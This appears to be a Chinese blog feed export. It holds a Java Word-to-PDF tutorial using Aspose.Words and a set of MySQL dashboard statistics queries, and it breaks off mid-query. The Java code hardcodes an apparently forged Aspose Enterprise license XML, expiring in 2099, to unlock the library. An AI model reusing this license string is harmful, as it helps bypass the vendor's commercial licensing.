        <content type="html"><![CDATA[<h1 id="Word转PDF"><a href="#Word转PDF" class="headerlink" title="Word转PDF"></a>Word转PDF</h1><ul><li>资源地址：<a href="https://download.csdn.net/download/qq_43681532/88716581">https://download.csdn.net/download/qq_43681532/88716581</a></li></ul><h2 id="引入依赖"><a href="#引入依赖" class="headerlink" title="引入依赖"></a>引入依赖</h2><pre class=" language-xml"><code class="language-xml">        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.aspose<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>aspose-words<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>21.11<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">></span></span>system<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>systemPath</span><span class="token punctuation">></span></span>${project.basedir}/src/main/resources/lib/aspose-words-21.11-jdk17.jar<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>systemPath</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span></code></pre><p>resource下新建目录，并将jar包复制进去</p><p><img src="/images/Word%E8%BD%ACPDF.png"></p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>aspose<span class="token punctuation">.</span>words<span class="token punctuation">.</span>License<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ByteArrayInputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>InputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>charset<span class="token punctuation">.</span>StandardCharsets<span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token keyword">static</span> com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>framework<span class="token punctuation">.</span>datasource<span class="token punctuation">.</span>DynamicDataSourceContextHolder<span class="token punctuation">.</span>log<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * @Classname PDFHelper * */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">PDFHelper</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>        InputStream is <span class="token operator">=</span> null<span class="token punctuation">;</span>        String licenseStr <span class="token operator">=</span>                <span class="token string">"&lt;License>\n"</span> <span class="token operator">+</span>                        <span class="token string">"    &lt;Data>\n"</span> <span class="token operator">+</span>                        <span class="token string">"        &lt;Products>\n"</span> <span class="token operator">+</span>                        <span class="token string">"            &lt;Product>Aspose.Total for Java&lt;/Product>\n"</span> <span class="token operator">+</span>                        <span class="token string">"            &lt;Product>Aspose.Words for Java&lt;/Product>\n"</span> <span class="token operator">+</span>                        <span class="token string">"        &lt;/Products>\n"</span> <span class="token operator">+</span>                        <span class="token string">"        &lt;EditionType>Enterprise&lt;/EditionType>\n"</span> <span class="token operator">+</span>                        <span class="token string">"        &lt;SubscriptionExpiry>20991231&lt;/SubscriptionExpiry>\n"</span> <span class="token operator">+</span>                        <span class="token string">"        &lt;LicenseExpiry>20991231&lt;/LicenseExpiry>\n"</span> <span class="token operator">+</span>                        <span class="token string">"        &lt;SerialNumber>8bfe198c-7f0c-4ef8-8ff0-acc3237bf0d7&lt;/SerialNumber>\n"</span> <span class="token operator">+</span>                        <span class="token string">"    &lt;/Data>\n"</span> <span class="token operator">+</span>                        <span class="token string">"    &lt;Signature>\n"</span> <span class="token operator">+</span>                        <span class="token string">"        sNLLKGMUdF0r8O1kKilWAGdgfs2BvJb/2Xp8p5iuDVfZXmhppo+d0Ran1P9TKdjV4ABwAgKXxJ3jcQTqE/2IRfqwnPf8itN8aFZlV3TJPYeD3yWE7IT55Gz6EijUpC7aKeoohTb4w2fpox58wWoF3SNp6sK6jDfiAUGEHYJ9pjU=\n"</span> <span class="token operator">+</span>                        <span class="token string">"    &lt;/Signature>\n"</span> <span class="token operator">+</span>                        <span class="token string">"&lt;/License>"</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//            is = new FileInputStream("C:\\Users\\Administrator\\Desktop\\tool\\license.xml");</span>        is <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>licenseStr<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span>StandardCharsets<span class="token punctuation">.</span>UTF_8<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        License license <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">License</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            license<span class="token punctuation">.</span><span class="token function">setLicense</span><span class="token punctuation">(</span>is<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//        FileUtil.copy("C:\\Users\\Administrator\\Desktop\\生成完整的信用报告\\202208171149.docx",</span><span class="token comment" spellcheck="true">//                "C:\\Users\\Administrator\\Desktop\\生成完整的信用报告\\202208171149V2.docx",false);</span><span class="token comment" spellcheck="true">//        doc2pdf("C:\\Users\\Administrator\\Desktop\\生成完整的信用报告\\企业信用报告.docx");</span>        <span class="token function">doc2pdfV2</span><span class="token punctuation">(</span><span class="token string">"F:\\我的文件\\谷歌.docx"</span><span class="token punctuation">,</span>                <span class="token string">"F:\\我的文件\\谷歌.pdf"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">doc2pdfV2</span><span class="token punctuation">(</span>String sourceFile<span class="token punctuation">,</span> String targetFile<span class="token punctuation">)</span> <span class="token punctuation">{</span>        InputStream is <span class="token operator">=</span> null<span class="token punctuation">;</span>        String licenseStr <span class="token operator">=</span>                <span class="token string">"&lt;License>\n"</span> <span class="token operator">+</span>                        <span class="token string">"    &lt;Data>\n"</span> <span class="token operator">+</span>                        <span class="token string">"        &lt;Products>\n"</span> <span class="token operator">+</span>                        <span class="token string">"            &lt;Product>Aspose.Total for Java&lt;/Product>\n"</span> <span class="token operator">+</span>                        <span class="token string">"            &lt;Product>Aspose.Words for Java&lt;/Product>\n"</span> <span class="token operator">+</span>                        <span class="token string">"        &lt;/Products>\n"</span> <span class="token operator">+</span>                        <span class="token string">"        &lt;EditionType>Enterprise&lt;/EditionType>\n"</span> <span class="token operator">+</span>                        <span class="token string">"        &lt;SubscriptionExpiry>20991231&lt;/SubscriptionExpiry>\n"</span> <span class="token operator">+</span>                        <span class="token string">"        &lt;LicenseExpiry>20991231&lt;/LicenseExpiry>\n"</span> <span class="token operator">+</span>                        <span class="token string">"        &lt;SerialNumber>8bfe198c-7f0c-4ef8-8ff0-acc3237bf0d7&lt;/SerialNumber>\n"</span> <span class="token operator">+</span>                        <span class="token string">"    &lt;/Data>\n"</span> <span class="token operator">+</span>                        <span class="token string">"    &lt;Signature>\n"</span> <span class="token operator">+</span>                        <span class="token string">"        sNLLKGMUdF0r8O1kKilWAGdgfs2BvJb/2Xp8p5iuDVfZXmhppo+d0Ran1P9TKdjV4ABwAgKXxJ3jcQTqE/2IRfqwnPf8itN8aFZlV3TJPYeD3yWE7IT55Gz6EijUpC7aKeoohTb4w2fpox58wWoF3SNp6sK6jDfiAUGEHYJ9pjU=\n"</span> <span class="token operator">+</span>                        <span class="token string">"    &lt;/Signature>\n"</span> <span class="token operator">+</span>                        <span class="token string">"&lt;/License>"</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//            is = new FileInputStream("C:\\Users\\Administrator\\Desktop\\tool\\license.xml");</span>        is <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>licenseStr<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span>StandardCharsets<span class="token punctuation">.</span>UTF_8<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        License license <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">License</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            license<span class="token punctuation">.</span><span class="token function">setLicense</span><span class="token punctuation">(</span>is<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token keyword">long</span> old <span class="token operator">=</span> System<span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            FileOutputStream os <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span>targetFile<span class="token punctuation">)</span><span class="token punctuation">;</span>            com<span class="token punctuation">.</span>aspose<span class="token punctuation">.</span>words<span class="token punctuation">.</span>Document doc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">com<span class="token punctuation">.</span>aspose<span class="token punctuation">.</span>words<span class="token punctuation">.</span>Document</span><span class="token punctuation">(</span>sourceFile<span class="token punctuation">)</span><span class="token punctuation">;</span>            doc<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span>os<span class="token punctuation">,</span> com<span class="token punctuation">.</span>aspose<span class="token punctuation">.</span>words<span class="token punctuation">.</span>SaveFormat<span class="token punctuation">.</span>PDF<span class="token punctuation">)</span><span class="token punctuation">;</span>            os<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">long</span> now <span class="token operator">=</span> System<span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"共耗时："</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>now <span class="token operator">-</span> old<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">1000.0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"秒"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//转化用时</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            log<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"word转pdf 报告生成异常"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">"报告生成失败！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h1 id><a href="#" class="headerlink" title></a></h1>]]></content>
      
      
      <categories>
          
          <category> Word </category>
          
          <category> PDF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Word操作 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大屏统计接口示例</title>
      <link href="/2022/05/22/da-ping-jie-kou-shi-li/"/>
      <url>/2022/05/22/da-ping-jie-kou-shi-li/</url>
      
        <content type="html"><![CDATA[<h1 id="大屏统计接口示例"><a href="#大屏统计接口示例" class="headerlink" title="大屏统计接口示例"></a>大屏统计接口示例</h1><p><img src="/images/%E5%A4%A7%E5%B1%8F%E6%8E%A5%E5%8F%A3%E7%A4%BA%E4%BE%8B.png" alt="接口示例"></p><ol><li>上报数量指标</li></ol><pre class=" language-sql"><code class="language-sql">        <span class="token keyword">SELECT</span><span class="token comment" spellcheck="true">-- 计算上报总数</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> f_t_exchanges<span class="token punctuation">)</span> <span class="token keyword">AS</span> upCount<span class="token punctuation">,</span><span class="token comment" spellcheck="true">-- 计算上报总数的同比</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> CONCAT<span class="token punctuation">(</span><span class="token function">ROUND</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span>    <span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span>    <span class="token keyword">FROM</span> f_t_exchanges    <span class="token keyword">WHERE</span> YEAR<span class="token punctuation">(</span>ft_time<span class="token punctuation">)</span> <span class="token operator">=</span> YEAR<span class="token punctuation">(</span><span class="token keyword">CURRENT_DATE</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span>    <span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token punctuation">(</span>        <span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span>        <span class="token keyword">FROM</span> f_t_exchanges        <span class="token keyword">WHERE</span> YEAR<span class="token punctuation">(</span>ft_time<span class="token punctuation">)</span> <span class="token operator">=</span> YEAR<span class="token punctuation">(</span><span class="token keyword">CURRENT_DATE</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span>    <span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">100</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'%'</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> f_t_exchanges <span class="token keyword">WHERE</span> YEAR<span class="token punctuation">(</span>ft_time<span class="token punctuation">)</span> <span class="token operator">=</span> YEAR<span class="token punctuation">(</span><span class="token keyword">CURRENT_DATE</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">AS</span> upTB<span class="token punctuation">,</span><span class="token comment" spellcheck="true">-- 计算赴台总人数</span>        <span class="token punctuation">(</span>        <span class="token keyword">SELECT</span> <span class="token function">SUM</span><span class="token punctuation">(</span>person_num<span class="token punctuation">)</span>        <span class="token keyword">FROM</span> f_t_exchanges<span class="token punctuation">)</span> <span class="token keyword">AS</span> personCount<span class="token punctuation">,</span><span class="token comment" spellcheck="true">-- 计算赴台总人数的同比</span>            <span class="token punctuation">(</span>        <span class="token keyword">SELECT</span>            CONCAT<span class="token punctuation">(</span><span class="token function">ROUND</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">SUM</span><span class="token punctuation">(</span>person_num<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span>            <span class="token keyword">SELECT</span> <span class="token function">SUM</span><span class="token punctuation">(</span>person_num<span class="token punctuation">)</span>            <span class="token keyword">FROM</span> f_t_exchanges            <span class="token keyword">WHERE</span> YEAR<span class="token punctuation">(</span>ft_time<span class="token punctuation">)</span> <span class="token operator">=</span> YEAR<span class="token punctuation">(</span><span class="token keyword">CURRENT_DATE</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span>            <span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token punctuation">(</span>            <span class="token keyword">SELECT</span> <span class="token function">SUM</span><span class="token punctuation">(</span>person_num<span class="token punctuation">)</span>            <span class="token keyword">FROM</span> f_t_exchanges            <span class="token keyword">WHERE</span> YEAR<span class="token punctuation">(</span>ft_time<span class="token punctuation">)</span> <span class="token operator">=</span> YEAR<span class="token punctuation">(</span><span class="token keyword">CURRENT_DATE</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span>            <span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'%'</span><span class="token punctuation">)</span>        <span class="token keyword">FROM</span> f_t_exchanges        <span class="token keyword">WHERE</span> YEAR<span class="token punctuation">(</span>ft_time<span class="token punctuation">)</span> <span class="token operator">=</span> YEAR<span class="token punctuation">(</span><span class="token keyword">CURRENT_DATE</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">AS</span> personTB</code></pre><ol start="2"><li>赴台上报统计</li></ol><pre class=" language-sql"><code class="language-sql">        <span class="token keyword">select</span> months<span class="token punctuation">.</span>monthNum<span class="token punctuation">,</span> IFNULL<span class="token punctuation">(</span><span class="token number">b</span><span class="token punctuation">.</span>upCount<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> upCount        <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token string">'一月'</span> <span class="token keyword">AS</span> monthNum              <span class="token keyword">UNION</span>              <span class="token keyword">SELECT</span> <span class="token string">'二月'</span>              <span class="token keyword">UNION</span>              <span class="token keyword">SELECT</span> <span class="token string">'三月'</span>              <span class="token keyword">UNION</span>              <span class="token keyword">SELECT</span> <span class="token string">'四月'</span>              <span class="token keyword">UNION</span>              <span class="token keyword">SELECT</span> <span class="token string">'五月'</span>              <span class="token keyword">UNION</span>              <span class="token keyword">SELECT</span> <span class="token string">'六月'</span>              <span class="token keyword">UNION</span>              <span class="token keyword">SELECT</span> <span class="token string">'七月'</span>              <span class="token keyword">UNION</span>              <span class="token keyword">SELECT</span> <span class="token string">'八月'</span>              <span class="token keyword">UNION</span>              <span class="token keyword">SELECT</span> <span class="token string">'九月'</span>              <span class="token keyword">UNION</span>              <span class="token keyword">SELECT</span> <span class="token string">'十月'</span>              <span class="token keyword">UNION</span>              <span class="token keyword">SELECT</span> <span class="token string">'十一月'</span>              <span class="token keyword">UNION</span>              <span class="token keyword">SELECT</span> <span class="token string">'十二月'</span>             <span class="token punctuation">)</span> <span class="token keyword">AS</span> months                 <span class="token keyword">LEFT</span> <span class="token keyword">JOIN</span><span class="token punctuation">(</span>            <span class="token keyword">SELECT</span> <span class="token keyword">CASE</span> MONTH <span class="token punctuation">(</span>create_time<span class="token punctuation">)</span> <span class="token keyword">WHEN</span> <span class="token number">1</span> <span class="token keyword">THEN</span> <span class="token string">'一月'</span>                        <span class="token keyword">WHEN</span> <span class="token number">2</span> <span class="token keyword">THEN</span> <span class="token string">'二月'</span>                        <span class="token keyword">WHEN</span> <span class="token number">3</span> <span class="token keyword">THEN</span> <span class="token string">'三月'</span>                        <span class="token keyword">WHEN</span> <span class="token number">4</span> <span class="token keyword">THEN</span> <span class="token string">'四月'</span>                        <span class="token keyword">WHEN</span> <span class="token number">5</span> <span class="token keyword">THEN</span> <span class="token string">'五月'</span>                        <span class="token keyword">WHEN</span> <span class="token number">6</span> <span class="token keyword">THEN</span> <span class="token string">'六月'</span>                        <span class="token keyword">WHEN</span> <span class="token number">7</span> <span class="token keyword">THEN</span> <span class="token string">'七月'</span>                        <span class="token keyword">WHEN</span> <span class="token number">8</span> <span class="token keyword">THEN</span> <span class="token string">'八月'</span>                        <span class="token keyword">WHEN</span> <span class="token number">9</span> <span class="token keyword">THEN</span> <span class="token string">'九月'</span>                        <span class="token keyword">WHEN</span> <span class="token number">10</span> <span class="token keyword">THEN</span> <span class="token string">'十月'</span>                        <span class="token keyword">WHEN</span> <span class="token number">11</span> <span class="token keyword">THEN</span> <span class="token string">'十一月'</span>                        <span class="token keyword">WHEN</span> <span class="token number">12</span> <span class="token keyword">THEN</span> <span class="token string">'十二月'</span>        <span class="token keyword">END</span>        <span class="token keyword">AS</span> monthTime<span class="token punctuation">,</span>                        <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">AS</span> upCount                        <span class="token keyword">FROM</span>                        f_t_exchanges                        <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> monthTime                <span class="token punctuation">)</span> <span class="token number">b</span> <span class="token keyword">on</span> <span class="token number">b</span><span class="token punctuation">.</span>monthTime<span class="token operator">=</span>months<span class="token punctuation">.</span>monthNum</code></pre><ol start="3"><li>赴台人员性别趋势对比</li></ol><pre class=" language-sql"><code class="language-sql"> <span class="token keyword">select</span> months<span class="token punctuation">.</span>monthNum<span class="token punctuation">,</span> IFNULL<span class="token punctuation">(</span><span class="token number">b</span><span class="token punctuation">.</span>maleCount<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> maleCount<span class="token punctuation">,</span> IFNULL<span class="token punctuation">(</span><span class="token number">b</span><span class="token punctuation">.</span>femaleCount<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> femaleCount        <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token string">'一月'</span> <span class="token keyword">AS</span> monthNum              <span class="token keyword">UNION</span>              <span class="token keyword">SELECT</span> <span class="token string">'二月'</span>              <span class="token keyword">UNION</span>              <span class="token keyword">SELECT</span> <span class="token string">'三月'</span>              <span class="token keyword">UNION</span>              <span class="token keyword">SELECT</span> <span class="token string">'四月'</span>              <span class="token keyword">UNION</span>              <span class="token keyword">SELECT</span> <span class="token string">'五月'</span>              <span class="token keyword">UNION</span>              <span class="token keyword">SELECT</span> <span class="token string">'六月'</span>              <span class="token keyword">UNION</span>              <span class="token keyword">SELECT</span> <span class="token string">'七月'</span>              <span class="token keyword">UNION</span>              <span class="token keyword">SELECT</span> <span class="token string">'八月'</span>              <span class="token keyword">UNION</span>              <span class="token keyword">SELECT</span> <span class="token string">'九月'</span>              <span class="token keyword">UNION</span>              <span class="token keyword">SELECT</span> <span class="token string">'十月'</span>              <span class="token keyword">UNION</span>              <span class="token keyword">SELECT</span> <span class="token string">'十一月'</span>              <span class="token keyword">UNION</span>              <span class="token keyword">SELECT</span> <span class="token string">'十二月'</span>             <span class="token punctuation">)</span> <span class="token keyword">AS</span> months                 <span class="token keyword">LEFT</span> <span class="token keyword">JOIN</span> <span class="token punctuation">(</span>            <span class="token keyword">SELECT</span> <span class="token keyword">CASE</span> MONTH <span class="token punctuation">(</span>create_time<span class="token punctuation">)</span> <span class="token keyword">WHEN</span>  <span class="token number">1</span> <span class="token keyword">THEN</span> <span class="token string">'一月'</span>                <span class="token keyword">WHEN</span>  <span class="token number">2</span> <span class="token keyword">THEN</span> <span class="token string">'二月'</span>                <span class="token keyword">WHEN</span>  <span class="token number">3</span> <span class="token keyword">THEN</span> <span class="token string">'三月'</span>                <span class="token keyword">WHEN</span>  <span class="token number">4</span> <span class="token keyword">THEN</span> <span class="token string">'四月'</span>                <span class="token keyword">WHEN</span>  <span class="token number">5</span> <span class="token keyword">THEN</span> <span class="token string">'五月'</span>                <span class="token keyword">WHEN</span>  <span class="token number">6</span> <span class="token keyword">THEN</span> <span class="token string">'六月'</span>                <span class="token keyword">WHEN</span>  <span class="token number">7</span> <span class="token keyword">THEN</span> <span class="token string">'七月'</span>                <span class="token keyword">WHEN</span>  <span class="token number">8</span> <span class="token keyword">THEN</span> <span class="token string">'八月'</span>                <span class="token keyword">WHEN</span>  <span class="token number">9</span> <span class="token keyword">THEN</span> <span class="token string">'九月'</span>                <span class="token keyword">WHEN</span>  <span class="token number">10</span> <span class="token keyword">THEN</span> <span class="token string">'十月'</span>                <span class="token keyword">WHEN</span>  <span class="token number">11</span> <span class="token keyword">THEN</span> <span class="token string">'十一月'</span>                <span class="token keyword">WHEN</span>  <span class="token number">12</span> <span class="token keyword">THEN</span> <span class="token string">'十二月'</span>        <span class="token keyword">END</span>        <span class="token keyword">AS</span> monthTime<span class="token punctuation">,</span>                <span class="token function">SUM</span><span class="token punctuation">(</span><span class="token keyword">CASE</span> <span class="token keyword">WHEN</span> sex <span class="token operator">=</span> <span class="token string">'男'</span> <span class="token keyword">THEN</span> <span class="token number">1</span> <span class="token keyword">ELSE</span> <span class="token number">0</span> <span class="token keyword">END</span><span class="token punctuation">)</span> <span class="token keyword">AS</span> maleCount<span class="token punctuation">,</span>                <span class="token function">SUM</span><span class="token punctuation">(</span><span class="token keyword">CASE</span> <span class="token keyword">WHEN</span> sex <span class="token operator">=</span> <span class="token string">'女'</span> <span class="token keyword">THEN</span> <span class="token number">1</span> <span class="token keyword">ELSE</span> <span class="token number">0</span> <span class="token keyword">END</span><span class="token punctuation">)</span> <span class="token keyword">AS</span> femaleCount                <span class="token keyword">FROM</span>                f_t_exchanges_person                <span class="token keyword">GROUP</span> <span class="token keyword">BY</span>                monthTime<span class="token punctuation">)</span>  <span class="token number">b</span> <span class="token keyword">on</span> <span class="token number">b</span><span class="token punctuation">.</span>monthTime<span class="token operator">=</span>months<span class="token punctuation">.</span>monthNum</code></pre><ol start="4"><li>业务地区分布</li></ol><pre class=" language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token number">a</span><span class="token punctuation">.</span>area<span class="token punctuation">,</span> IFNULL<span class="token punctuation">(</span><span class="token number">b</span><span class="token punctuation">.</span>upCount<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> upCount        <span class="token keyword">FROM</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token string">'南平市'</span> <span class="token keyword">AS</span> area              <span class="token keyword">UNION</span>              <span class="token keyword">SELECT</span> <span class="token string">'宁德市'</span>              <span class="token keyword">UNION</span>              <span class="token keyword">SELECT</span> <span class="token string">'三明市'</span>              <span class="token keyword">UNION</span>              <span class="token keyword">SELECT</span> <span class="token string">'福州市'</span>              <span class="token keyword">UNION</span>              <span class="token keyword">SELECT</span> <span class="token string">'龙岩市'</span>              <span class="token keyword">UNION</span>              <span class="token keyword">SELECT</span> <span class="token string">'泉州市'</span>              <span class="token keyword">UNION</span>              <span class="token keyword">SELECT</span> <span class="token string">'莆田市'</span>              <span class="token keyword">UNION</span>              <span class="token keyword">SELECT</span> <span class="token string">'漳州市'</span>              <span class="token keyword">UNION</span>              <span class="token keyword">SELECT</span> <span class="token string">'厦门市'</span>             <span class="token punctuation">)</span> <span class="token keyword">AS</span> <span class="token number">a</span>                 <span class="token keyword">LEFT</span> <span class="token keyword">JOIN</span><span class="token punctuation">(</span>            <span class="token keyword">SELECT</span> <span class="token keyword">LEFT</span><span class="token punctuation">(</span>area<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span> area<span class="token punctuation">,</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> upCount <span class="token keyword">FROM</span> f_t_exchanges <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> area        <span class="token punctuation">)</span> <span class="token number">b</span> <span class="token keyword">ON</span> <span class="token number">a</span><span class="token punctuation">.</span>area <span class="token operator">=</span> <span class="token number">b</span><span class="token punctuation">.</span>area</code></pre><ol start="5"><li>赴台人员年龄趋势统计</li></ol><pre class=" language-sql"><code class="language-sql"> <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token punctuation">[</span>CDATA<span class="token punctuation">[</span>        <span class="token keyword">select</span> months<span class="token punctuation">.</span>monthNum             <span class="token punctuation">,</span> IFNULL<span class="token punctuation">(</span><span class="token number">b</span><span class="token punctuation">.</span>age_15_30<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>    age15             <span class="token punctuation">,</span> IFNULL<span class="token punctuation">(</span><span class="token number">b</span><span class="token punctuation">.</span>age_30_45<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>    age30             <span class="token punctuation">,</span> IFNULL<span class="token punctuation">(</span><span class="token number">b</span><span class="token punctuation">.</span>age_45_60<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>    age45             <span class="token punctuation">,</span> IFNULL<span class="token punctuation">(</span><span class="token 